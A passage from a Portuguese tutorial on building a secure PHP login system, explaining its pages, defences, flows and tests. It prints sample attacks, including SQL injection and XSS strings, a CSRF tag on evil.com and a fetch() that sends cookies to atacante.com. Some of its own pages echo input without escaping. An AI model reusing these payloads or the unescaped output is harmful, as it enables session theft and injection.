                    <input type="password" id="senha" name="senha" required
                           minlength="8" autocomplete="new-password"
                           placeholder="Sua senha segura">
                </div>
Campo de senha:
type="password"
•	Oculta caracteres digitados
•	Mostra bolinhas ou asteriscos
autocomplete="new-password"
•	Instrui navegador que é senha nova
•	Pode sugerir gerador de senhas
                <div class="form-group">
                    <label for="confirmar_senha">Confirmar Senha:*</label>
                    <input type="password" id="confirmar_senha" name="confirmar_senha" required
                           minlength="8" autocomplete="new-password"
                           placeholder="Digite a senha novamente">
                </div>
                
                <button type="submit" class="btn btn-primary btn-block">Cadastrar</button>
            </form>
            
            <div class="links">
                <a href="index.php">← Voltar para Home</a>
                <a href="login.php">Já tem conta? Faça login</a>
            </div>
        </div>
    </div>
</body>
</html>
Confirmação de senha:
•	Previne erros de digitação
•	Validado no servidor (senhas devem ser idênticas)
Links de navegação:
•	Facilita acesso a outras páginas
•	Boa prática de UX
8.3 Página de Login (login.php)
<?php 
require_once '../src/config/config.php';

if (isLoggedIn()) {
    header('Location: dashboard.php');
    exit();
}

$csrf_token = Security::generateCSRFToken();
?>
Mesma lógica do cadastro:
•	Protege contra acesso duplicado
•	Gera token CSRF
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Sistema Seguro</title>
    <link rel="stylesheet" href="assets/css/style.css">
</head>
<body>
    <div class="container">
        <div class="card">
            <h1>🔑 Login Seguro</h1>
            
            <?php
            $success = Session::getFlash('success');
            $error = Session::getFlash('error');
            
            if ($success): ?>
                <div class="alert alert-success">
                    <?php echo $success; ?>
                </div>
            <?php endif;
            
            if ($error): ?>
                <div class="alert alert-error">
                    <?php echo $error; ?>
                </div>
            <?php endif; ?>
            
            <form method="POST" action="../src/controllers/AuthController.php?action=login" class="form">
                <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>">
                
                <div class="form-group">
                    <label for="email">Email:</label>
                    <input type="email" id="email" name="email" required
                           value="<?php echo $_POST['email'] ?? ''; ?>"
                           placeholder="seu@email.com">
                </div>
                
                <div class="form-group">
                    <label for="senha">Senha:</label>
                    <input type="password" id="senha" name="senha" required
                           autocomplete="current-password"
                           placeholder="Sua senha">
                </div>
Campo de senha no login:
autocomplete="current-password"
•	Diferente de "new-password"
•	Navegador pode sugerir senha salva
•	Integração com gerenciadores de senha
                <button type="submit" class="btn btn-primary btn-block">Entrar</button>
            </form>
            
            <div class="demo-credentials">
                <p><strong>Credenciais de teste:</strong></p>
                <p>Email: exemplo@email.com</p>
                <p>Senha: 12345678</p>
            </div>
            
            <div class="links">
                <a href="index.php">← Voltar para Home</a>
                <a href="cadastro.php">Não tem conta? Cadastre-se</a>
            </div>
        </div>
    </div>
</body>
</html>
Formulário simples:
•	Apenas email e senha
•	Menos campos que cadastro
•	Foco na velocidade de acesso
8.4 Dashboard (dashboard.php)
<?php
require_once '../src/config/config.php';
require_once '../src/models/User.php';
requireLogin();
Proteção da página:
requireLogin();
•	Função crítica: bloqueia acesso não autorizado
•	Redireciona para login se não estiver autenticado
// Buscar dados do usuário
try {
    $userModel = new User($pdo);
    $usuario = $userModel->findById($_SESSION['user_id']);
    
    if (!$usuario) {
        session_destroy();
        header('Location: login.php');
        exit();
    }
    
    // Buscar histórico de login
    $loginHistory = $userModel->getLoginHistory($_SESSION['user_id'], 5);
} catch(PDOException $e) {
    error_log("Erro ao carregar usuário: " . $e->getMessage());
    die("Erro ao carregar dados.");
}

$csrf_token = Security::generateCSRFToken();
?>
Carregamento de dados:
$usuario = $userModel->findById($_SESSION['user_id']);
•	Busca dados atualizados do banco
•	Não confia apenas na sessão
if (!$usuario) {
    session_destroy();
    header('Location: login.php');
    exit();
}
•	Se usuário não existe mais (foi deletado)
•	Destrói sessão e força novo login
$loginHistory = $userModel->getLoginHistory($_SESSION['user_id'], 5);
•	Busca últimos 5 acessos
•	Exibido na interface
html
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - Sistema Seguro</title>
    <link rel="stylesheet" href="assets/css/style.css">
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="dashboard-header">
                <div>
                    <h1>📊 Dashboard Seguro</h1>
                    <p>Bem-vindo de volta!</p>
                </div>
                <div class="user-info">
                    <span>Olá, <strong><?php echo htmlspecialchars($usuario['nome']); ?></strong></span>
                    <a href="logout.php" class="btn btn-danger">Sair</a>
                </div>
            </div>
Cabeçalho personalizado:
<?php echo htmlspecialchars($usuario['nome']); ?>
•	Sempre usar htmlspecialchars() ao exibir dados
•	Previne XSS mesmo vindo do banco
•	Defesa em profundidade
            <?php
            $success = Session::getFlash('success');
            $error = Session::getFlash('error');
            
            if ($success): ?>
                <div class="alert alert-success">
                    <?php echo $success; ?>
                </div>
            <?php endif;
            
            if ($error): ?>
                <div class="alert alert-error">
                    <?php echo $error; ?>
                </div>
            <?php endif; ?>
            
            <div class="dashboard-grid">
                <div class="info-card">
                    <h3>👤 Informações da Conta</h3>
                    <div class="info-list">
                        <p><strong>ID:</strong> #<?php echo $usuario['id']; ?></p>
                        <p><strong>Nome:</strong> <?php echo htmlspecialchars($usuario['nome']); ?></p>
                        <p><strong>Email:</strong> <?php echo htmlspecialchars($usuario['email']); ?></p>
                        <p><strong>Data de Cadastro:</strong> <?php echo date('d/m/Y H:i', strtotime($usuario['data_cadastro'])); ?></p>
                        <p><strong>Último Login:</strong> <?php echo $usuario['ultimo_login'] ? date('d/m/Y H:i', strtotime($usuario['ultimo_login'])) : 'Primeiro acesso'; ?></p>
                    </div>
                </div>
Formatação de datas:
date('d/m/Y H:i', strtotime($usuario['data_cadastro']))
•	strtotime(): converte string para timestamp
•	date(): formata timestamp
•	d/m/Y H:i: formato brasileiro (15/01/2024 10:30)
$usuario['ultimo_login'] ? date(...) : 'Primeiro acesso'
•	Operador ternário: condição ? valor_se_true : valor_se_false
•	Se NULL, mostra "Primeiro acesso"
                <div class="info-card">
                    <h3>🔒 Segurança</h3>
                    <div class="security-status">
                        <p>✅ Sessão segura ativa</p>
                        <p>✅ Autenticação validada</p>
                        <p>✅ Conexão criptografada</p>
                        <p>🕒 Sessão iniciada: <?php echo date('H:i:s'); ?></p>
                    </div>
                </div>
Informações de segurança:
•	Visual para transmitir confiança
•	Horário da sessão atual
                <div class="info-card">
                    <h3>📝 Atualizar Perfil</h3>
                    <form method="POST" action="../src/controllers/UserController.php?action=update_profile" class="form">
                        <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>">
                        <div class="form-group">
                            <label for="nome">Nome:</label>
                            <input type="text" id="nome" name="nome" required 
                                   value="<?php echo htmlspecialchars($usuario['nome']); ?>"
                                   minlength="2" maxlength="100">
                        </div>
                        <button type="submit" class="btn btn-secondary">Atualizar Nome</button>
                    </form>
                </div>
Formulário de atualização:
•	Pré-preenchido com dados atuais
•	Token CSRF incluído
•	Permite editar apenas o nome (pode ser expandido)
                <?php if (!empty($loginHistory)): ?>
                <div class="info-card">
                    <h3>📋 Histórico de Acesso</h3>
                    <div class="history-list">
                        <?php foreach ($loginHistory as $log): ?>
                            <div class="history-item <?php echo $log['sucesso'] ? 'success' : 'error'; ?>">
                                <span class="action"><?php echo $log['acao']; ?></span>
                                <span class="date"><?php echo date('d/m H:i', strtotime($log['data_acesso'])); ?></span>
                                <span class="ip"><?php echo $log['ip_address']; ?></span>
                                <span class="status"><?php echo $log['sucesso'] ? '✅' : '❌'; ?></span>
                            </div>
                        <?php endforeach; ?>
                    </div>
                </div>
                <?php endif; ?>
            </div>
Histórico de acessos:
<?php if (!empty($loginHistory)): ?>
•	Só exibe se houver logs
<?php foreach ($loginHistory as $log): ?>
•	Itera sobre array de logs
<div class="history-item <?php echo $log['sucesso'] ? 'success' : 'error'; ?>">
•	Classe CSS dinâmica baseada no sucesso
•	Visual verde para sucesso, vermelho para falha
            <div class="actions">
                <a href="index.php" class="btn btn-secondary">Página Inicial</a>
                <a href="logout.php" class="btn btn-danger">Sair do Sistema</a>
            </div>
        </div>
    </div>
</body>
</html>
Botões de ação:
•	Navegação clara
•	Botão de logout destacado
8.5 Logout (logout.php)
<?php
require_once '../src/config/config.php';

// Registrar log de logout
if (isset($_SESSION['user_id'])) {
    try {
        Security::logAccess($pdo, $_SESSION['user_id'], 'logout', true);
    } catch(Exception $e) {
        error_log("Erro ao registrar logout: " . $e->getMessage());
    }
}
Auditoria de logout:
•	Registra saída do usuário
•	Mesmo com erro, o logout continua
•	Log é "best effort" (melhor esforço)
// Destruir sessão completamente
Session::destroy();

// Redirecionar para login com mensagem
Session::setFlash('success', 'Logout realizado com sucesso!');
header('Location: login.php');
exit();
?>
Processo de logout:
1.	Registra log (antes de destruir sessão)
2.	Destrói sessão (limpa dados e cookie)
3.	Define mensagem flash (nova sessão)
4.	Redireciona para login
Importante:
Session::setFlash('success', 'Logout realizado com sucesso!');
•	Mensagem definida após Session::destroy()
•	Flash message inicia nova sessão temporária
________________________________________
9. Segurança Implementada
9.1 Proteção contra SQL Injection
Prepared Statements em todas as queries:
// ❌ VULNERÁVEL
$sql = "SELECT * FROM usuarios WHERE email = '$email'";
$result = $pdo->query($sql);

// ✅ SEGURO
$sql = "SELECT * FROM usuarios WHERE email = ?";
$stmt = $pdo->prepare($sql);
$stmt->execute([$email]);
Como funciona:
1.	SQL é compilado separadamente
2.	Valores são passados como parâmetros
3.	Banco faz escape automático
4.	Impossível injetar código SQL
Exemplo de ataque bloqueado:
// Tentativa de injeção
$email = "' OR '1'='1";

// Com query direta (VULNERÁVEL)
"SELECT * FROM usuarios WHERE email = '' OR '1'='1'"
// Retorna TODOS os usuários!

// Com prepared statement (SEGURO)
"SELECT * FROM usuarios WHERE email = ?' OR '1'='1'"
// Busca literalmente o texto "' OR '1'='1"
9.2 Proteção contra XSS
Sanitização de saída com htmlspecialchars():
// ❌ VULNERÁVEL
<?php echo $usuario['nome']; ?>

// ✅ SEGURO
<?php echo htmlspecialchars($usuario['nome']); ?>
Conversões realizadas:
Caractere	Entidade HTML	Resultado
<	&lt;	Exibe literalmente
>	&gt;	Exibe literalmente
"	&quot;	Não quebra atributos
'	&#039;	Não quebra atributos
&	&amp;	Não interpreta entidades
Exemplo de ataque bloqueado:
// Usuário tenta cadastrar nome malicioso
$nome = "<script>alert('XSS')</script>";

// Sem sanitização (VULNERÁVEL)
<p>Olá, <script>alert('XSS')</script></p>
// JavaScript é executado!
// Com htmlspecialchars() (SEGURO)
<p>Olá, &lt;script&gt;alert('XSS')&lt;/script&gt;</p>
// Exibe como texto, não executa
9.3 Proteção CSRF (Cross-Site Request Forgery)
Como funciona o ataque CSRF:
<!-- Site malicioso evil.com -->
<img src="https://seusite.com/deleteAccount.php">
Cenário do ataque:
1.	Usuário está logado no seu site
2.	Visita site malicioso
3.	Site malicioso faz requisição ao seu site
4.	Cookie de sessão é enviado automaticamente
5.	Ação é executada sem consentimento
Nossa proteção:
// 1. Gerar token único por sessão
$csrf_token = Security::generateCSRFToken();
<!-- 2. Incluir em formulário -->
<input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>">
// 3. Validar no servidor
if (!Security::verifyCSRFToken($_POST['csrf_token'] ?? '')) {
    die("Token inválido");
}
Por que funciona:
•	Token gerado aleatoriamente
•	Armazenado na sessão do servidor
•	Site malicioso não consegue ler o token
•	Mesmo com cookie, requisição falha sem token correto
Comparação segura com hash_equals():
// ❌ VULNERÁVEL a timing attacks
if ($_SESSION['csrf_token'] == $token) { ... }

// ✅ SEGURO (tempo constante)
if (hash_equals($_SESSION['csrf_token'], $token)) { ... }
Timing Attack explicado:
// Comparação normal
"abc123" == "xyz789"
// Para no primeiro caractere diferente (mais rápido)
"abc123" == "abc789"
// Compara até o 4º caractere (mais lento)

// Atacante mede tempo e descobre caracteres corretos
hash_equals() previne isso:
•	Sempre leva o mesmo tempo
•	Compara todos os caracteres
•	Impossível deduzir conteúdo pelo tempo
9.4 Criptografia de Senhas (Bcrypt)
Nunca armazene senhas em texto puro!
// ❌ TERRÍVEL
INSERT INTO usuarios (senha) VALUES ('12345678')

// ❌ RUIM (MD5/SHA1 são rápidos demais)
INSERT INTO usuarios (senha) VALUES (md5('12345678'))

// ✅ EXCELENTE (Bcrypt)
$hash = password_hash('12345678', PASSWORD_DEFAULT);
INSERT INTO usuarios (senha_hash) VALUES ('$2y$10$...')

**Estrutura do hash Bcrypt:**
$2y$10$fMkIWhYAK0YFdqeDOktZdO$FAOeo1c0WYcMYd9e3onDnSHdjY7keDG
│  │ │                      │
│  │ │                      └─ Hash (31 chars)
│  │ └─ Salt (22 chars)
│  └─ Cost (número de rounds: 2^10 = 1024)
└─ Algoritmo (2y = Bcrypt)
Características do Bcrypt:
1.	Salt aleatório automático 
o	Cada hash é único, mesmo para senhas iguais
o	Salt armazenado junto com hash
2.	Custo ajustável
   password_hash($senha, PASSWORD_BCRYPT, ['cost' => 12]);
•	Quanto maior, mais lento (mais seguro)
•	Default: 10 (bom equilíbrio)
3.	Lento por design 
o	Dificulta ataques de força bruta
o	~50-100ms por tentativa
Verificação de senha:
$hash = '$2y$10$fMkIWhYAK0YFdqeDOktZdOFAOeo1c0WYcMYd9e3onDnSHdjY7keDG';
$senha = '12345678';

if (password_verify($senha, $hash)) {
    echo "Senha correta!";
}
Como password_verify() funciona:
1.	Extrai salt do hash
2.	Aplica bcrypt na senha informada com o mesmo salt
3.	Compara resultado com hash armazenado
9.5 Sessões Seguras
Configurações implementadas:
session_set_cookie_params([
    'lifetime' => 0,           // Expira ao fechar navegador
    'path' => '/',             // Válido para todo site
    'domain' => '',            // Domínio atual
    'secure' => true,          // Apenas HTTPS
    'httponly' => true,        // JavaScript não acessa
    'samesite' => 'Strict'     // Anti-CSRF
]);
Explicação detalhada:
lifetime: 0
'lifetime' => 0
•	Cookie de sessão (não persistente)
•	Deletado ao fechar o navegador
•	Segurança: reduz janela de ataque
secure: true
'secure' => true
•	Cookie só enviado via HTTPS
•	Protege contra: sniffing em redes inseguras
•	Desenvolvimento: mude para false se não usar SSL local
httponly: true
'httponly' => true
•	JavaScript não consegue ler document.cookie
•	Protege contra: roubo de sessão via XSS
Exemplo de ataque bloqueado:
// Código malicioso injetado via XSS
fetch('http://atacante.com/?cookie=' + document.cookie);
// Com httponly=true, document.cookie não contém PHPSESSID
samesite: Strict
'samesite' => 'Strict'
•	Cookie não enviado em requisições cross-site
•	Protege contra: CSRF
Diferenças entre valores:
Valor	Comportamento
Strict	Cookie nunca enviado de outros sites
Lax	Cookie enviado em navegação GET (links)
None	Cookie sempre enviado (requer secure=true)
Exemplo prático:
<!-- Site malicioso -->
<a href="https://seusite.com/dashboard.php">Clique aqui</a>

- **Strict**: Cookie não enviado, usuário não logado
- **Lax**: Cookie enviado, usuário logado
- **None**: Cookie sempre enviado

### 9.6 Validação de Entrada

**Camadas de validação:**
┌───────────────────────┐
│    HTML5 (Cliente)    │  ← Validação básica
├───────────────────────┤
│  JavaScript (Cliente) │  ← UX melhorada
├───────────────────────┤
│    PHP (Servidor) *   │  ← VALIDAÇÃO REAL
└───────────────────────┘
Nunca confie apenas no cliente!
<!-- HTML5 pode ser ignorado -->
<input type="email" required>
javascript
// JavaScript pode ser desabilitado
if (!validEmail(email)) { return; }
Validação no servidor (OBRIGATÓRIA):
// 1. Sanitização (limpeza)
$nome = Security::sanitizeInput($_POST['nome']);
$email = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL);

// 2. Validação (verificação)
if (!Security::validateEmail($email)) {
    $errors[] = "Email inválido";
}

if (!Security::validatePassword($senha)) {
    $errors[] = "Senha deve ter 8+ caracteres";
}
Tipos de validação implementados:
Nome
public static function validateName($name) {
    return !empty($name) && strlen($name) >= 2 && strlen($name) <= 100;
}
•	Não vazio
•	Mínimo: 2 caracteres
•	Máximo: 100 caracteres
Email
public static function validateEmail($email) {
    return filter_var($email, FILTER_VALIDATE_EMAIL);
}
•	Formato válido (user@domain.com)
•	filter_var(): função nativa robusta
Senha
public static function validatePassword($password) {
    return strlen($password) >= 8;
}
•	Mínimo: 8 caracteres
•	Pode ser expandida:
  return strlen($password) >= 8 
      && preg_match('/[A-Z]/', $password)      // Maiúscula
      && preg_match('/[a-z]/', $password)      // Minúscula
      && preg_match('/[0-9]/', $password)      // Número
      && preg_match('/[^A-Za-z0-9]/', $password); // Especial
9.7 Logs de Auditoria
Sistema completo de rastreamento:
Security::logAccess($pdo, $user_id, $action, $success);
Informações capturadas:
Campo	        Fonte	                      Propósito
usuario_id	Sessão/POST	                Quem fez a ação
ip_address	$_SERVER['REMOTE_ADDR']	    De onde veio
user_agent	$_SERVER['HTTP_USER_AGENT']	Qual dispositivo
acao	    Parâmetro	                O que foi feito
sucesso	    Parâmetro	                Resultado (1/0)
data_acesso	TIMESTAMP	                Quando ocorreu
Eventos registrados:
1.	Login bem-sucedido
   Security::logAccess($pdo, $user_id, 'login', true);
2.	Tentativa de login falha
   Security::logAccess($pdo, $user_id, 'login_failed', false);
3.	Logout
   Security::logAccess($pdo, $user_id, 'logout', true);
Utilidades dos logs:
•	Detectar ataques: múltiplas falhas de login
•	Auditoria: quem acessou e quando
•	Debugging: rastrear problemas
•	Conformidade: LGPD/GDPR exigem logs
Exemplo de consulta útil:
-- Detectar possível ataque de força bruta
SELECT ip_address, COUNT(*) as tentativas
FROM logs_acesso
WHERE acao = 'login_failed'
  AND data_acesso > NOW() - INTERVAL 1 HOUR
GROUP BY ip_address
HAVING tentativas > 5;
9.8 Proteções Adicionais
9.8.1 Prevenção de Enumeração de Usuários
❌ Mensagem reveladora:
if (!$usuario) {
    echo "Email não cadastrado";
} else {
    echo "Senha incorreta";
}
✅ Mensagem genérica:
if (!$usuario || !password_verify($senha, $usuario['senha_hash'])) {
    echo "Email ou senha incorretos";
}
Por que é importante:
•	Atacante não descobre emails válidos
•	Impossível fazer lista de alvos
9.8.2 Rate Limiting (Conceito)
Não implementado no código atual, mas importante:
// Verificar tentativas recentes
$tentativas = contarTentativas($ip, $email, ultimaHora);

if ($tentativas > 5) {
    die("Muitas tentativas. Aguarde 1 hora.");
}
Implementação com cache:
// Usando Redis ou Memcached
$key = "login_attempts:$ip";
$attempts = $redis->incr($key);
$redis->expire($key, 3600); // 1 hora

if ($attempts > 5) {
    http_response_code(429); // Too Many Requests
    die("Rate limit excedido");
}
9.8.3 Timeout de Sessão
Adicionar ao config.php:
// Timeout de inatividade (30 minutos)
define('SESSION_TIMEOUT', 1800);

// Verificar última atividade
if (isset($_SESSION['last_activity'])) {
    if (time() - $_SESSION['last_activity'] > SESSION_TIMEOUT) {
        Session::destroy();
        Session::setFlash('error', 'Sessão expirada por inatividade');
        header('Location: login.php');
        exit();
    }
}

$_SESSION['last_activity'] = time();
9.8.4 Regeneração de Session ID
Prevenir session fixation:
// Após login bem-sucedido
session_regenerate_id(true);

**Como funciona:**
1. Gera novo ID de sessão
2. Mantém dados da sessão
3. Invalida ID anterior

**Ataque prevenido:**
1. Atacante força vítima a usar session ID conhecido
2. Vítima faz login com esse ID
3. Atacante usa mesmo ID para acessar conta
4. session_regenerate_id() invalida ID antigo
## 10. Fluxo de Funcionamento

### 10.1 Fluxo de Cadastro
┌─────────────────────────────────────────────────────────────┐
│                     FLUXO DE CADASTRO                       │
└─────────────────────────────────────────────────────────────┘

1. USUÁRIO acessa cadastro.php
   ↓
2. PHP gera token CSRF
   Security::generateCSRFToken()
   ↓
3. USUÁRIO preenche formulário
   - Nome, Email, Senha, Confirmar Senha
   ↓
4. NAVEGADOR valida (HTML5)
   - required, minlength, type="email"
   ↓
5. SUBMIT → AuthController.php?action=register
   ↓
6. SERVIDOR verifica CSRF token
   Security::verifyCSRFToken()
   ↓
7. SERVIDOR sanitiza entrada
   Security::sanitizeInput(), filter_var()
   ↓
8. SERVIDOR valida dados
   validateName(), validateEmail(), validatePassword()
   ↓
9. SERVIDOR verifica email duplicado
   User->emailExists()
   ↓
10. SERVIDOR criptografa senha
    password_hash($senha, PASSWORD_DEFAULT)
    ↓
11. SERVIDOR insere no banco
    User->create($nome, $email, $hash)
    ↓
12. SUCESSO → Redireciona para login.php
    Session::setFlash('success', 'Cadastro realizado!')
Exemplo prático:
// Entrada do usuário
Nome: "João Silva"
Email: "joao@email.com"
Senha: "SenhaForte123"

// Processamento
$nome = "João Silva"           // sanitizado
$email = "joao@email.com"      // validado
$hash = "$2y$10$abc123..."     // criptografado

// Resultado no banco
INSERT INTO usuarios (nome, email, senha_hash) 
VALUES ('João Silva', 'joao@email.com', '$2y$10$abc123...')

### 10.2 Fluxo de Login
┌─────────────────────────────────────────────────────────────┐
│                     FLUXO DE LOGIN                          │
└─────────────────────────────────────────────────────────────┘

1. USUÁRIO acessa login.php
   ↓
2. PHP gera token CSRF
   ↓
3. USUÁRIO preenche email/senha
   ↓
4. SUBMIT → AuthController.php?action=login
   ↓
5. SERVIDOR verifica CSRF token
   ↓
6. SERVIDOR valida formato do email
   ↓
7. SERVIDOR busca usuário no banco
   User->findByEmail($email)
   ↓
8. SERVIDOR compara senha
   password_verify($senha, $hash_do_banco)
   ↓
   ├─ FALHOU → Registra log (login_failed)
   │            Redireciona com erro
   │
   └─ SUCESSO ↓
9. SERVIDOR verifica se conta está ativa
   if ($usuario['ativo'] == 1)
   ↓
10. SERVIDOR cria sessão
    Session::setUser($usuario)
    $_SESSION['user_id'] = ...
    $_SESSION['user_nome'] = ...
    ↓
11. SERVIDOR atualiza último login
    User->updateLastLogin($id)
    UPDATE usuarios SET ultimo_login = NOW()
    ↓
12. SERVIDOR registra log de sucesso
    Security::logAccess(..., 'login', true)
    ↓
13. REDIRECIONA para dashboard.php
Exemplo de dados na sessão:
$_SESSION = [
    'user_id' => 1,
    'user_nome' => 'João Silva',
    'user_email' => 'joao@email.com',
    'logged_in' => true,
    'csrf_token' => 'a7f3c9e2b1d4f8a6...'
]
### 10.3 Fluxo de Acesso ao Dashboard
┌─────────────────────────────────────────────────────────────┐
│                    ACESSO AO DASHBOARD                      │
└─────────────────────────────────────────────────────────────┘

1. USUÁRIO acessa dashboard.php
   ↓
2. PHP verifica autenticação
   requireLogin()
   ├─ NÃO logado → Redireciona para login.php
   └─ Logado → Continua ↓
   ↓
3. SERVIDOR busca dados do usuário
   User->findById($_SESSION['user_id'])
   ↓
4. SERVIDOR busca histórico de acessos
   User->getLoginHistory($user_id, 5)
   ↓
5. PHP renderiza página com dados
   - Informações da conta
   - Status de segurança
   - Formulário de atualização
   - Histórico de acessos
### 10.4 Fluxo de Atualização de Perfil
┌─────────────────────────────────────────────────────────────┐
│                  ATUALIZAÇÃO DE PERFIL                      │
└─────────────────────────────────────────────────────────────┘

1. USUÁRIO altera nome no dashboard
   ↓
2. SUBMIT → UserController.php?action=update_profile
   ↓
3. SERVIDOR verifica autenticação
   isLoggedIn()
   ↓
4. SERVIDOR verifica CSRF token
   ↓
5. SERVIDOR pega ID da sessão
   $user_id = $_SESSION['user_id']
   ↓
6. SERVIDOR sanitiza novo nome
   Security::sanitizeInput($_POST['nome'])
   ↓
7. SERVIDOR valida nome
   Security::validateName($nome)
   ↓
8. SERVIDOR atualiza no banco
   UPDATE usuarios SET nome = ? WHERE id = ?
   ↓
9. SERVIDOR atualiza sessão
   $_SESSION['user_nome'] = $nome
   ↓
10. REDIRECIONA para dashboard.php
    Session::setFlash('success', 'Perfil atualizado!')
### 10.5 Fluxo de Logout
┌─────────────────────────────────────────────────────────────┐
│                           LOGOUT                            │
└─────────────────────────────────────────────────────────────┘

1. USUÁRIO clica em "Sair"
   ↓
2. Acessa logout.php
   ↓
3. SERVIDOR registra log
   Security::logAccess(..., 'logout', true)
   ↓
4. SERVIDOR destroi sessão
   Session::destroy()
   ├─ $_SESSION = []
   ├─ session_destroy()
   └─ Deleta cookie PHPSESSID
   ↓
5. SERVIDOR cria nova sessão (temporária)
   Para armazenar flash message
   ↓
6. REDIRECIONA para login.php
   Session::setFlash('success', 'Logout realizado!')
________________________________________
11. Testando o Sistema
11.1 Preparação do Ambiente
Passo 1: Instalar XAMPP/WAMP/MAMP
•	Windows: XAMPP (https://www.apachefriends.org/)
•	Mac: MAMP (https://www.mamp.info/)
•	Linux: LAMP Stack
Passo 2: Criar estrutura de pastas
C:/xampp/htdocs/sistemalogin/
├── public/
│   ├── assets/
│   │   └── css/
│   │       └── style.css
│   ├── cadastro.php
│   ├── dashboard.php
│   ├── index.php
│   ├── login.php
│   └── logout.php
├── src/
│   ├── config/
│   │   └── config.php
│   ├── controllers/
│   │   ├── AuthController.php
│   │   └── UserController.php
│   ├── models/
│   │   └── User.php
│   └── utils/
│       ├── Security.php
│       └── Session.php
└── database.sql
Passo 3: Criar banco de dados
-- Abrir phpMyAdmin (http://localhost/phpmyadmin)
-- Executar o arquivo database.sql
Passo 4: Ajustar configurações
No arquivo src/config/config.php:
// Desenvolvimento
define('ENVIRONMENT', 'development');

// Sessões sem HTTPS (desenvolvimento local)
'secure' => false,  // Mudar para true em produção

// Credenciais do banco
$host = 'localhost';
$usuario = 'root';
$senha = '';  // Vazio no XAMPP
$banco = 'sistema_login';
11.2 Casos de Teste
Teste 1: Cadastro Bem-Sucedido
Passos:
1.	Acessar: http://localhost/sistemalogin/public/cadastro.php
2.	Preencher: 
o	Nome: "Maria Silva"
o	Email: "maria@teste.com"
o	Senha: "senha12345"
o	Confirmar: "senha12345"
3.	Clicar em "Cadastrar"
Resultado esperado:
•	✅ Redirecionamento para login.php
•	✅ Mensagem: "Cadastro realizado com sucesso!"
•	✅ Registro no banco com senha hash
Verificar no banco:
SELECT id, nome, email, senha_hash, ativo 
FROM usuarios 
WHERE email = 'maria@teste.com';
#### Teste 2: Validações de Cadastro
**2.1 - Nome muito curto**
Nome: "A"
Resultado: "Nome deve ter entre 2 e 100 caracteres"
**2.2 - Email inválido**
Email: "invalido"
Resultado: "Email inválido"
**2.3 - Senha curta**
Senha: "123"
Resultado: "Senha deve ter pelo menos 8 caracteres"

**2.4 - Senhas diferentes**
Senha: "senha12345"
Confirmar: "senha54321"
Resultado: "Senhas não coincidem"
**2.5 - Email duplicado**
Email: "maria@teste.com" (já cadastrado)
Resultado: "Este email já está cadastrado"
Teste 3: Login Bem-Sucedido
Passos:
1.	Acessar: http://localhost/sistemalogin/public/login.php
2.	Preencher: 
o	Email: "exemplo@email.com"
o	Senha: "12345678"
3.	Clicar em "Entrar"
Resultado esperado:
•	✅ Redirecionamento para dashboard.php
•	✅ Mensagem: "Login realizado com sucesso!"
•	✅ Nome exibido no cabeçalho
•	✅ Log registrado na tabela logs_acesso
Verificar no banco:
SELECT * FROM logs_acesso 
WHERE usuario_id = 1 
ORDER BY data_acesso DESC 
LIMIT 1;
#### Teste 4: Login com Falhas
**4.1 - Email não cadastrado**
Email: "naoexiste@email.com"
Senha: "qualquer"
Resultado: "Email ou senha incorretos"
**4.2 - Senha incorreta**
Email: "exemplo@email.com"
Senha: "errada"
Resultado: "Email ou senha incorretos"
Log: Tentativa falha registrada
4.3 - Conta desativada
-- Desativar conta
UPDATE usuarios SET ativo = 0 WHERE id = 1;
Resultado: "Conta desativada"
Teste 5: Proteções de Segurança
5.1 - Teste CSRF (sem token)
# Simular requisição sem token
curl -X POST http://localhost/sistemalogin/src/controllers/AuthController.php?action=login \
  -d "email=teste@email.com&senha=12345678"
**Resultado esperado:**
"Token de segurança inválido"
**5.2 - Teste XSS**
Tentar cadastrar:
Nome: "<script>alert('XSS')</script>"

**Resultado esperado:**
- Nome salvo como: `&lt;script&gt;alert('XSS')&lt;/script&gt;`
- Exibido como texto, não executado

**5.3 - Teste SQL Injection**

Tentar login com:
Email: "' OR '1'='1"
Senha: "qualquer"
Resultado esperado:
•	"Email ou senha incorretos"
•	Prepared statement bloqueia injeção
Teste 6: Dashboard e Atualização
Passos:
1.	Fazer login
2.	No dashboard, alterar nome para "João Atualizado"
3.	Clicar em "Atualizar Nome"
Resultado esperado:
•	✅ Mensagem: "Perfil atualizado com sucesso!"
•	✅ Nome atualizado na interface
•	✅ $_SESSION['user_nome'] atualizado
•	✅ Banco de dados atualizado
Verificar:
SELECT nome FROM usuarios WHERE id = 1;
#### Teste 7: Logout
**Passos:**
1. Estando logado, clicar em "Sair"
**Resultado esperado:**
- ✅ Redirecionamento para login.php
- ✅ Mensagem: "Logout realizado com sucesso!"
- ✅ Tentativa de acessar dashboard.php redireciona para login
- ✅ Log de logout registrado

**Verificar acesso:**
Acessar: http://localhost/sistemalogin/public/dashboard.php
Resultado: Redireciona para login.php
#### Teste 8: Proteção de Páginas
**8.1 - Acessar dashboard sem login**
URL: /public/dashboard.php
Resultado: Redireciona para login.php
Mensagem: "Por favor, faça login para acessar esta página"
**8.2 - Acessar login já logado**
Fazer login → Tentar acessar login.php
Resultado: Redireciona para dashboard.php
11.3 Testes de Segurança Avançados
Teste de Session Hijacking
Cenário:
1.	Usuário A faz login
2.	Capturar PHPSESSID do usuário A
3.	Tentar usar em navegador anônimo
Resultado esperado:
•	Com httponly=true: JavaScript não consegue ler cookie
•	Com samesite=Strict: Cookie não enviado de outro domínio
Teste de Força Bruta
Simular múltiplas tentativas:
// Script de teste (NÃO usar em produção real)
for ($i = 0; $i < 10; $i++) {
    // Tentar login com senha errada
}
**Melhorias sugeridas:**
- Implementar rate limiting
- Bloquear IP após N tentativas
- Adicionar CAPTCHA
### 11.4 Checklist de Segurança
✅ Prepared statements em todas as queries
✅ htmlspecialchars() em todas as saídas
✅ Token CSRF em todos os formulários
✅ Senhas com password_hash() (Bcrypt)
✅ Sessões com httponly e samesite
✅ Validação no servidor (não só cliente)
✅ Mensagens genéricas (não revela se email existe)
✅ Logs de auditoria
